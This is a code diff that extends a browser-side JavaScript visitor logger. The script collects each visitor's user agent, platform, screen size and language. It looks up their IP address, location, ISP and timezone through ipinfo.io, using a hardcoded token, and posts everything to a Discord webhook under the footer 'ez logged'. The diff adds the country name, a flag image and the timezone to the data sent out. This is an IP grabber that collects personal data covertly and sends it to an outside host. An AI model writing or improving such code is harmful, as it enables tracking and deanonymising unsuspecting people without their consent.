@@ -119,67 +119,81 @@
         // Fetch geolocation info from ipinfo.io
         fetch('https://ipinfo.io?token=0a7775d6f7e150') // Replace with your ipinfo.io token
             .then(response => response.json())
-            .then(data => {
+            .then(geoData => {
                 const geoInfo = {
-                    ip: data.ip,
-                    country: data.country,
-                    region: data.region,
-                    city: data.city,
-                    org: data.org
+                    ip: geoData.ip,
+                    countryCode: geoData.country,
+                    region: geoData.region,
+                    city: geoData.city,
+                    org: geoData.org,
+                    timezone: geoData.timezone
                 };
 
-                // Construct the embedded message content for Discord
-                const embed = {
-                    embeds: [{
-                        title: "logged information",
-                        color: 3447003,  // You can change the color code
-                        fields: [
-                            {
-                                name: "Device Information",
-                                value: `
-                                **User Agent:** ${deviceInfo.userAgent}
-                                **Platform:** ${deviceInfo.platform}
-                                **Screen Width:** ${deviceInfo.screenWidth}
-                                **Screen Height:** ${deviceInfo.screenHeight}
-                                **Language:** ${deviceInfo.language}
-                                `,
-                                inline: false
+                // Fetch full country name using the country code
+                fetch(`https://restcountries.com/v3.1/alpha/${geoInfo.countryCode}`)
+                    .then(response => response.json())
+                    .then(countryData => {
+                        const countryName = countryData[0].name.common; // Full country name
+                        const flagURL = `https://flagcdn.com/48x36/${geoInfo.countryCode.toLowerCase()}.png`; // Country flag URL
+
+                        // Construct the embedded message content for Discord
+                        const embed = {
+                            embeds: [{
+                                title: "Logged Information",
+                                color: 3447003,  // You can change the color code
+                                fields: [
+                                    {
+                                        name: "Device Information",
+                                        value: `
+                                        **User Agent:** ${deviceInfo.userAgent}
+                                        **Platform:** ${deviceInfo.platform}
+                                        **Screen Width:** ${deviceInfo.screenWidth}
+                                        **Screen Height:** ${deviceInfo.screenHeight}
+                                        **Language:** ${deviceInfo.language}
+                                        `,
+                                        inline: false
+                                    },
+                                    {
+                                        name: "IP Information",
+                                        value: `
+                                        **IP Address:** ${geoInfo.ip}
+                                        **Country:** ${countryName} (${geoInfo.countryCode})
+                                        **Region:** ${geoInfo.region}
+                                        **City:** ${geoInfo.city}
+                                        **Organization:** ${geoInfo.org}
+                                        **Timezone:** ${geoInfo.timezone}
+                                        `,
+                                        inline: false
+                                    }
+                                ],
+                                thumbnail: {
+                                    url: flagURL // Displays the country flag
+                                },
+                                footer: {
+                                    text: "ez logged"
+                                },
+                                timestamp: new Date()  // Adds the timestamp
+                            }]
+                        };
+
+                        // Send the embedded information to the Discord webhook
+                        fetch(webhookURL, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
                             },
-                            {
-                                name: "ip Information",
-                                value: `
-                                **IP Address:** ${geoInfo.ip}
-                                **Country:** ${geoInfo.country}
-                                **Region:** ${geoInfo.region}
-                                **City:** ${geoInfo.city}
-                                **Organization:** ${geoInfo.org}
-                                `,
-                                inline: false
+                            body: JSON.stringify(embed)
+                        })
+                        .then(response => {
+                            if (response.ok) {
+                                console.log('Device and geo info sent to webhook');
+                            } else {
+                                console.error('Error sending info', response.statusText);
                             }
-                        ],
-                        footer: {
-                            text: "ez logged"
-                        },
-                        timestamp: new Date()  // Adds the timestamp
-                    }]
-                };
-
-                // Send the embedded information to the Discord webhook
-                fetch(webhookURL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(embed)
-                })
-                .then(response => {
-                    if (response.ok) {
-                        console.log('Device and geo info sent to webhook');
-                    } else {
-                        console.error('Error sending info', response.statusText);
-                    }
-                })
-                .catch(error => console.error('Error sending info:', error));
+                        })
+                        .catch(error => console.error('Error sending info:', error));
+                    })
+                    .catch(error => console.error('Error fetching full country name:', error));
             })
             .catch(error => console.error('Error fetching geo info:', error));
     }
